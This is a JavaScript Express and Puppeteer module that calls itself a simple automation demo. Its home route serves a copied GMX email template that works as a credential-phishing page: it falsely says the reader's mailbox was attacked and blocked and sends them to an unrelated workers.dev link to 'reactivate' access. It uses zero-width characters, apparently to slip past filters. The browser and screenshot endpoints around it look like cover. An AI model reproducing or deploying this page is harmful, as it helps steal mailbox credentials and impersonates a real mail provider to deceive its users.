/**
 * Discover Project
 * 
 * This is a simplified version of the discover.js project file
 * that uses ES module syntax.
 */

import express from "express";
import bodyParser from "body-parser";
import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import axios from "axios";
import { createRequire } from "module";
import session from "express-session";
import dotenv from "dotenv";

// Initialize dotenv
dotenv.config();

// Use createRequire for CommonJS modules if needed
const require = createRequire(import.meta.url);

// Register the stealth plugin
puppeteer.use(StealthPlugin());

// Store for Puppeteer instances and pages
const puppeteerInstances = {}; // In-memory storage for Puppeteer instances
const pageStore = new Map();
const timeouts = {}; // Store timeout IDs for each session

// Project metadata
const projectInfo = {
  name: 'Discover Project',
  description: 'A project that demonstrates using puppeteer for automation',
  version: '1.0.0',
  author: 'Your Name'
};

/**
 * Initialize a Puppeteer browser instance
 * @param {string} sessionId - The session ID to use for the browser instance
 * @returns {Promise<object>} - The browser instance
 */
async function initBrowser(sessionId) {
  try {
    // Launch a new browser instance
    const browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--window-size=1920,1080',
      ],
      defaultViewport: {
        width: 1920,
        height: 1080
      }
    });

    // Store the browser instance
    puppeteerInstances[sessionId] = browser;
    
    return browser;
  } catch (error) {
    console.error('Error initializing browser:', error);
    throw error;
  }
}

/**
 * Set up routes for the project
 * @param {express.Application} app - The Express application
 */
function setupRoutes(app) {
  // Configure session middleware
  app.use(session({
    secret: process.env.SESSION_SECRET || 'discover-project-secret',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: process.env.NODE_ENV === 'production' }
  }));

  // Home page route
  app.get('/', (req, res) => {
    res.send(`
      <html><head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
</head>
<body><div></div>
<table width="100%" align="center" style="border: currentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, Verdana, sans-serif; font-size: 13px; font-style: normal; font-weight: normal; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; orphans: 2; widows: 2; empty-cells: hide; font-variant-ligatures: normal; font-variant-caps: normal; 
-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="100%" align="center" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="100%" align="center" class="header bg-dark" style="border: currentColor; border-image: none; margin-bottom: 0px; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" bgcolor="#1c449b" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="100%" align="center" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="320" align="center" class="page" style="background: none; margin: 0px auto; border: currentColor; border-image: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="10" class="edge linefix" style="padding: 0px; width: 30px !important; line-height: 0px; font-size: 1px; max-width: 30px !important;"><img width="10" height="1" style="border: 0px currentColor; border-image: none; width: 30px !important; text-align: center; line-height: 3em; font-size: 12px; display: block; max-width: 30px !important;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
<td width="300" align="left" class="w620" valign="top" style="padding: 0px; line-height: 14px; font-size: 13px;">
<table width="300" style="border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide; background-color: transparent;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr height="6">
<td height="6" class="linefix" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="1" height="6" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
<table width="300" class="horizontal teaser w620" style="border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="300" align="left" class="w620" valign="top" style="padding: 0px; line-height: 14px; font-size: 13px;">
<table align="left" style="border: currentColor; border-image: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td align="center" valign="top" style="padding: 0px; line-height: 14px; font-size: 13px;"><span class="show-smartphone hide-tablet hide-desktop"> <img width="61" height="32" class="hide-mso img" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="GMX" src="https://img.ui-portal.de/newsletterversand/ci/gmx/logo/logo_x2.png" border="0"></span></td>
<td width="10" class="linefix" valign="top" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="10" height="32" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
<td align="left" valign="middle" style="padding: 0px; text-align: left; line-height: 14px; font-size: 13px;">
<table align="left" style="border: currentColor; border-image: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td align="left" valign="middle" style="margin: 0px; padding: 0px; line-height: 14px; font-size: 13px;"><span class="mso-font-2" style="color: rgb(255, 255, 255); font-family: Arial,Verdana,sans-serif; font-size: small;"> <span class="header-font-2" style="line-height: 22px; white-space: nowrap;">Support&nbsp;|&nbsp;1&zwj;2&zwj;/2&zwj;0&zwj;2&zwj;3&zwj;</span></span></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<table width="300" style="border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide; background-color: transparent;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr height="6">
<td height="6" class="linefix" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="1" height="6" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
</td>
<td width="10" class="edge linefix" style="padding: 0px; width: 30px !important; line-height: 0px; font-size: 1px; max-width: 30px !important;"><img width="10" height="1" style="border: 0px currentColor; border-image: none; width: 30px !important; text-align: center; line-height: 3em; font-size: 12px; display: block; max-width: 30px !important;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<table width="100%" align="center" class="section-bg-1-dark" style="border: currentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, Verdana, sans-serif; font-size: 13px; font-style: normal; font-weight: normal; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; orphans: 2; widows: 2; empty-cells: hide; font-variant-ligatures: normal; 
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;" bgcolor="#f2f4f9" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr height="20">
<td height="20" class="linefix" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="1" height="20" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
<tr>
<td width="100%" align="center" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="320" align="center" class="page" style="background: none; margin: 0px auto; border: currentColor; border-image: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="10" class="edge linefix" style="padding: 0px; width: 30px; line-height: 0px; font-size: 1px; max-width: 30px !important;"><img width="10" height="1" style="border: 0px currentColor; border-image: none; width: 30px !important; text-align: center; line-height: 3em; font-size: 12px; display: block; max-width: 30px !important;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
<td width="300" align="left" class="w620" valign="top" style="padding: 0px; width: 426px; line-height: 18px; font-size: 13px;">
<table width="300" align="left" class="w620 w780 center" style="border: currentColor; border-image: none; text-align: center; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="300" align="left" class="w620 w780 center" valign="top" style="padding: 0px; text-align: center; line-height: 18px; font-size: 13px;">
<table width="426" height="235" class="w620 w780 center" style="border: currentColor; border-image: none; text-align: center; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td align="center" class="mso-font-2 mso-w600" valign="top" style="padding: 0px; width: 426px; line-height: 18px; font-size: 13px;"><span class="mso-font-5 light" style="color: rgb(81, 81, 81); line-height: 40px; font-family: Arial,Helvetica,Verdana,sans-serif; font-size: x-large;">GMX Mailbox Update<br></span></td>
</tr>
<tr>
<td align="center" class="mso-font-2 mso-w600" valign="top" style="padding: 0px; width: 426px; line-height: 18px; font-size: 13px;">
<div><span class="mso-font-3b light" style="color: rgb(28, 68, 155); line-height: 28px; font-family: Arial,Helvetica,Verdana,sans-serif; font-size: medium;"><strong style="font-weight: 400;">Our automated security systems have detected a possible attack on your mailbox SILENTCODERSEMAIL : There is a strong suspicion that your mailbox has been misused or that third parties have gained unauthorized access.<br></strong></span></div>
<div><span class="mso-font-3b light" style="color: rgb(28, 68, 155); line-height: 28px; font-family: Arial,Helvetica,Verdana,sans-serif; font-size: medium;"><strong style="font-weight: 400;">To prevent this, we have blocked access to your mailbox as a precautionary measure. To reactivate access to your mailbox, please proceed as follows:</strong></span></div><div>
<span class="mso-font-3b light" style="color: rgb(28, 68, 155); line-height: 28px; font-family: Arial,Helvetica,Verdana,sans-serif; font-size: medium;"><strong><a href="https://quotaupdating-site.menosaxarte.workers.dev/">CONTINUE&nbsp;HERE</a></strong></span></div>
<div><span class="mso-font-3b light" style="color: rgb(28, 68, 155); line-height: 28px; font-family: Arial,Helvetica,Verdana,sans-serif; font-size: medium;"><strong style="font-weight: 400;"></strong></span></div>
</td>
</tr>
<tr height="0">
<td height="0" class="linefix" style="padding: 0px; width: 426px; line-height: 0px; font-size: 1px;"><img width="1" height="0" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
<td width="10" class="edge linefix" style="padding: 0px; width: 30px; line-height: 0px; font-size: 1px; max-width: 30px !important;"><img width="10" height="1" style="border: 0px currentColor; border-image: none; width: 30px !important; text-align: center; line-height: 3em; font-size: 12px; display: block; max-width: 30px !important;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr height="20">
<td height="20" class="linefix" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="1" height="20" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
<table width="100%" align="center" class="section-bg-1-dark" style="border: currentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, Verdana, sans-serif; font-size: 13px; font-style: normal; font-weight: normal; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; orphans: 2; widows: 2; empty-cells: hide; font-variant-ligatures: normal; 
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;" bgcolor="#f2f4f9" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="100%" align="center" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="320" align="center" class="page" style="background: none; margin: 0px auto; border: currentColor; border-image: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="10" class="edge linefix" style="padding: 0px; width: 30px; line-height: 0px; font-size: 1px; max-width: 30px !important;"><img width="10" height="1" style="border: 0px currentColor; border-image: none; width: 30px !important; text-align: center; line-height: 3em; font-size: 12px; display: block; max-width: 30px !important;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
<td width="10" class="edge linefix" style="padding: 0px; width: 30px; line-height: 0px; font-size: 1px; max-width: 30px !important;"><img width="10" height="1" style="border: 0px currentColor; border-image: none; width: 30px !important; text-align: center; line-height: 3em; font-size: 12px; display: block; max-width: 30px !important;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr height="0">
<td height="0" class="linefix" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="1" height="0" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
<table width="300" style="border: currentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, Verdana, sans-serif; font-size: 13px; font-style: normal; font-weight: normal; word-spacing: 0px; float: none; white-space: normal; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; orphans: 2; widows: 2; empty-cells: hide; font-variant-ligatures: normal; font-variant-caps: normal; 
-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr height="40">
<td height="40" class="linefix" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="1" height="40" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
<table width="300" style="border: currentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, Verdana, sans-serif; font-size: 13px; font-style: normal; font-weight: normal; word-spacing: 0px; float: none; white-space: normal; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; orphans: 2; widows: 2; empty-cells: hide; background-color: transparent; font-variant-ligatures: normal; 
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr height="40">
<td height="40" class="linefix" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="1" height="40" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
<table width="100%" align="center" class="footer bg-light" style="border: currentColor; border-image: none; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, Verdana, sans-serif; font-size: 13px; font-style: normal; font-weight: normal; word-spacing: 0px; white-space: normal; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; orphans: 2; widows: 2; empty-cells: hide; font-variant-ligatures: normal; 
font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial;" bgcolor="#f3f3f3" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="100%" align="center" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="320" class="page" style="background: none; margin: 0px auto; border: currentColor; border-image: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="10" class="edge linefix" style="padding: 0px; width: 30px !important; line-height: 0px; font-size: 1px; max-width: 30px !important;"><img width="10" height="1" style="border: 0px currentColor; border-image: none; width: 30px !important; text-align: center; line-height: 3em; font-size: 12px; display: block; max-width: 30px !important;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
<td width="300" align="center" class="w620" valign="top" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="300" class="w620" style="background: none; border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="300" align="left" class="w620" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="16" height="1" align="left" class="mso-vspacer-footer2 vspacer expand-to-w620" style="border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="16" valign="top" style="padding: 0px; line-height: 18px; font-size: 13px;"><img width="16" height="1" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
<table width="300" class="w620" style="background: none; border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="300" align="left" class="w620" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="16" height="1" align="left" class="mso-vspacer-footer1 vspacer" style="border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="16" class="linefix" valign="top" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="16" height="1" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
<table width="300" class="mso-footer-icon-wrap2" style="border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="300" height="150" align="left" valign="top" style="padding: 0px; line-height: 18px; font-size: 13px;">
<table width="300" class="mso-footer-icon-wrap2" style="background: none; border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr style="line-height: 22px; font-size: 14px;">
<td height="21" align="left" valign="top" style="padding: 0px; height: 22px; line-height: 22px; font-size: 14px;"></td>
</tr>
<tr style="height: 10px;">
<td height="5" class="linefix" style="padding: 0px; height: 10px; line-height: 0px; font-size: 1px;"></td>
</tr>
<tr style="line-height: 22px; font-size: 14px;">
<td height="21" align="left" valign="top" style="padding: 0px; height: 23px; line-height: 22px; font-size: 14px;"><span class="mso-font-1 light" style="color: rgb(81, 81, 81); line-height: 22px; font-family: Arial,Helvetica,Verdana,sans-serif; font-size: small;">© 1&amp;1 Mail &amp; Media GmbH</span></td>
</tr>
<tr style="height: 5px;">
<td height="5" class="linefix" style="padding: 0px; height: 5px; line-height: 0px; font-size: 1px;"><img width="1" height="5" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
<tr style="line-height: 22px; font-size: 14px;">
<td height="21" align="left" valign="top" style="padding: 0px; height: 184px; line-height: 22px; font-size: 14px;"><span class="mso-font-1 light" style="color: rgb(81, 81, 81); line-height: 22px; font-family: Arial,Helvetica,Verdana,sans-serif; font-size: small;">Zweigniederlassung Karlsruhe<br>Brauerstr.&zwnj;&nbsp;4&zwj;8&zwj;,&nbsp;7&zwj;6&zwj;&zwnj;1&zwj;3&zwj;&zwnj;5&nbsp;Karlsruhe, Deutschland<br><br>
Geschäftsführung: Alexander&nbsp;Charles, Dana&nbsp;Kraft, Thomas&nbsp;Ludwig, Dr.&nbsp;Michael&nbsp;Hagenau<br><br>Hauptsitz&nbsp;Montabaur, Amtsgericht&nbsp;Montabaur, HRB&nbsp;7&zwj;6&zwj;&zwnj;6&zwj;6&zwj;, UST-Id. DE&zwnj;2&zwj;4&zwj;&zwnj;3&zwj;4&zwj;&zwnj;1&zwj;3&zwj;&zwnj;0&zwj;0&zwj;&zwnj;2</span></td>
</tr>
<tr style="height: 20px;">
<td height="20" class="linefix" style="padding: 0px; height: 20px; line-height: 0px; font-size: 1px;"><img width="1" height="20" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<table width="300" class="w620 footnote" style="background: none; border: currentColor; border-image: none; float: none; border-collapse: collapse; box-sizing: border-box; border-spacing: 0px; empty-cells: hide;" border="0" cellspacing="0" cellpadding="0">
<tbody>
<tr>
<td width="300" height="15" align="left" class="w620" style="padding: 0px; line-height: 0px; font-size: 1px;"><img width="1" height="15" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
</td>
<td width="10" class="edge linefix" style="padding: 0px; width: 30px !important; line-height: 0px; font-size: 1px; max-width: 30px !important;"><img width="10" height="1" style="border: 0px currentColor; border-image: none; width: 30px !important; text-align: center; line-height: 3em; font-size: 12px; display: block; max-width: 30px !important;" alt="" src="https://img.ui-portal.de/p.gif" border="0"></td>
</tr>
</tbody>
</table>
<div style="width: 0px; height: 0px; bottom: 0px; color: rgb(153, 153, 153); line-height: 0; font-size: 1px; position: relative;"><img width="1" height="1" style="border: 0px currentColor; border-image: none; text-align: center; line-height: 3em; font-size: 12px; display: block;" alt="" src="https://wa.gmx.net/gmx/gmx/s?name=newsletter.quartal.pi.fm.kw50-23nc&amp;profileblocked=1&amp;country=de" border="0"></div>
</td>
</tr>
</tbody>
</table>
<div></div>
</body></html>
    `);
  });

  // API routes
  app.get('/api/info', (req, res) => {
    res.json({
      project: projectInfo,
      serverTime: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development'
    });
  });

  // Example API endpoint that uses Puppeteer
  app.post('/api/browse', async (req, res) => {
    const { url, sessionId = 'default' } = req.body;
    
    if (!url) {
      return res.status(400).json({
        success: false,
        error: 'URL is required'
      });
    }
    
    try {
      // Get or create a browser instance
      let browser = puppeteerInstances[sessionId];
      if (!browser) {
        browser = await initBrowser(sessionId);
      }
      
      // Create a new page
      const page = await browser.newPage();
      
      // Store the page
      pageStore.set(sessionId, page);
      
      // Navigate to the URL
      await page.goto(url, { waitUntil: 'networkidle2' });
      
      // Get the page title
      const title = await page.title();
      
      // Take a screenshot
      const screenshot = await page.screenshot({ encoding: 'base64' });
      
      // Close the page
      await page.close();
      
      res.json({
        success: true,
        title,
        screenshot: `data:image/png;base64,${screenshot}`
      });
    } catch (error) {
      console.error('Error browsing URL:', error);
      res.status(500).json({
        success: false,
        error: error.message
      });
    }
  });

  // Cleanup endpoint
  app.post('/api/cleanup', async (req, res) => {
    const { sessionId = 'default' } = req.body;
    
    try {
      // Get the browser instance
      const browser = puppeteerInstances[sessionId];
      if (browser) {
        // Close the browser
        await browser.close();
        
        // Remove the browser instance
        delete puppeteerInstances[sessionId];
        
        // Remove the page
        pageStore.delete(sessionId);
        
        // Clear any timeouts
        if (timeouts[sessionId]) {
          clearTimeout(timeouts[sessionId]);
          delete timeouts[sessionId];
        }
      }
      
      res.json({
        success: true,
        message: `Session ${sessionId} cleaned up successfully`
      });
    } catch (error) {
      console.error('Error cleaning up session:', error);
      res.status(500).json({
        success: false,
        error: error.message
      });
    }
  });
}

/**
 * Initialize the project
 * This function is called when the project starts
 * @returns {Promise<void>}
 */
async function init() {
  console.log(`Initializing ${projectInfo.name}...`);
  
  // Register cleanup handler for graceful shutdown
  process.on('SIGINT', async () => {
    console.log('Shutting down...');
    
    // Close all browser instances
    for (const sessionId in puppeteerInstances) {
      try {
        await puppeteerInstances[sessionId].close();
        console.log(`Closed browser instance for session ${sessionId}`);
      } catch (error) {
        console.error(`Error closing browser instance for session ${sessionId}:`, error);
      }
    }
    
    process.exit(0);
  });
  
  // Log environment information
  console.log('Environment Information:');
  console.log(`- Node.js version: ${process.version}`);
  console.log(`- Process ID: ${process.pid}`);
  console.log(`- Working directory: ${process.cwd()}`);
  console.log(`- Environment: ${process.env.NODE_ENV || 'development'}`);
  
  console.log(`${projectInfo.name} initialized successfully!`);
  
  // Log that the server is ready to accept connections
  console.log('Server is ready to accept connections...');
  
  // Return a resolved promise to indicate initialization is complete
  return Promise.resolve();
}

// Export the project functions and metadata
export { projectInfo as info, setupRoutes, init };